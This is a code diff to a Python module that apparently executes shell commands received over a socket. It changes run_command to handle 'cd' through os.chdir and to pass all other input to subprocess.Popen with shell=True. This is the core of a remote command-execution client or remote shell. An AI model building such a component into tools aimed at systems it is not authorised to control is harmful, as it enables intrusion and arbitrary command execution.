@@ -1,6 +1,5 @@
+import os
 import subprocess
-import time
-
 from command_payload import CommandPayload
 from command_payload import parse_payload_to_output
 from secure_socket import SecureSocket
@@ -66,8 +65,17 @@ def create_socket():
 # Run a line of shell command and returns the result
 # Todo: Keep one subprocess alive
 def run_command(cmd):
-    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
+    cmd_split = cmd.split(" ")
+    result = ["", ""]
+    if cmd_split[0] == "cd":
+        if len(cmd_split) > 1:
+            try:
+                os.chdir(cmd_split[1])
+            except:
+                result[1] = "No such directory"
+    else:
+        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result = str(proc.stdout.read().decode("utf-8")), str(proc.stderr.read().decode("utf-8"))
     return result
 
 
